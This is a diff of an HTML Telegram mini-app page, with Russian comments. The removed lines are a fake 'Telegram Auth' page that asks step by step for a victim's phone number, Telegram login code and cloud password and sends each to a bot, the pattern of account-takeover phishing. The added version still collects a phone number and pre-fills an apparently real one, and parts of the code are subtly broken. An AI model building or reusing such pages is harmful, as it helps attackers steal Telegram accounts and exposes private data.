@@ -3,57 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Auth</title>
+    <title>Telegram Login</title>
+    <!-- ПОДКЛЮЧАЕМ СКРИПТ ТЕЛЕГРАМА -->
     <script src="https://telegram.org"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fff; }
-        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 85%; padding: 10px; background: #0088cc; color: #white; border: none; border-radius: 5px; cursor: pointer; }
-        .hidden { display: none; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #fff; }
+        h2 { font-weight: bold; margin-bottom: 20px; }
+        input { width: 80%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 20px; }
+        button { width: 85%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:active { background-color: #0077b5; }
     </style>
 </head>
 <body>
-    <div id="phone-step">
-        <h3>Введите номер телефона</h3>
-        <input type="text" id="phone" placeholder="+79991234567">
-        <button onclick="sendPhone()">Продолжить</button>
-    </div>
 
-    <div id="code-step" class="hidden">
-        <h3>Введите код из Telegram</h3>
-        <input type="text" id="code" placeholder="12345">
-        <button onclick="sendCode()">Войти</button>
-    </div>
-
-    <div id="password-step" class="hidden">
-        <h3>Введите облачный пароль</h3>
-        <input type="password" id="password" placeholder="Пароль">
-        <button onclick="sendPassword()">Подтвердить</button>
-    </div>
+    <h2>Введите номер телефона</h2>
+    
+    <!-- Добавили id="phone", чтобы скрипт мог найти номер -->
+    <input type="text" id="phone" value="+79133681204" placeholder="+7...">
+    
+    <!-- Добавили onclick, который запускает отправку -->
+    <button onclick="sendPhoneNumber()">Продолжить</button>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
+        tg.expand(); // Разворачивает окно на весь экран
 
-        function sendPhone() {
-            const phone = document.getElementById('phone').value;
-            tg.sendData("phone:" + phone);
-            document.getElementById('phone-step').classList.add('hidden');
-            document.getElementById('code-step').classList.remove('hidden');
+        function sendPhoneNumber() {
+            const phoneInput = document.getElementById('phone').value;
+            
+            if (phoneInput.length < 10) {
+                alert("Введите корректный номер");
+                return;
+            }
+
+            // САМАЯ ВАЖНАЯ СТРОЧКА: отправляет данные боту
+            tg.sendData("phone:" + phoneInput);
+            
+            // Закрываем мини-приложение, так как данные ушли боту
+            tg.close();
         }
-
-        function sendCode() {
-            const code = document.getElementById('code').value;
-            tg.sendData("code:" + code);
-        }
-
-        function sendPassword() {
-            const pwd = document.getElementById('password').value;
-            tg.sendData("password:" + pwd);
-        }
-
-        // Если бот пришлет ошибку пароля, можно вручную переключить шаг
-        // (Для упрощения в этом примере переключение логикой бота)
     </script>
 </body>
 </html>
